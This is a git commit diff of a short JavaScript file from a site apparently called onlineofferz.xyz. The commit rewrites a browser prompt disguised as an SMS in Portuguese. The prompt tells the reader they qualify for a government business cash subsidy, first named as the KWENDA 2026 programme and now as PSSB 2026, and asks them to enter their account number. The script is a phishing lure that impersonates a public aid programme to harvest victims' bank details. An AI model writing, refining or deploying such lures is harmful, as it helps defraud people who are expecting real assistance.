3488c2f59f7e2691b27a6230a40d918dbabc6f88
All-Bonuses <hezzlaww@gmail.com>
2026-01-04 02:04:20 +0100

    Update actives.js

--- actives.js
+++ actives.js
@@ -1,7 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'RETIRAR DINHEIRO'
 password = prompt(
-  'SMS: Parabéns! Você é elegível para receber o Subsídio em Dinheiro do Programa KWENDA 2026 para Negócios. Por favor, clique em OK para introduzir o número da sua conta.',
+  'SMS: Parabéns! Você é elegível para receber o Subsídio em Dinheiro Empresarial do PSSB 2026. Por favor, clique em OK para introduzir o número da sua conta.',
   'RETIRAR DINHEIRO'
 );
 if (password != 'RETIRAR DINHEIRO') {
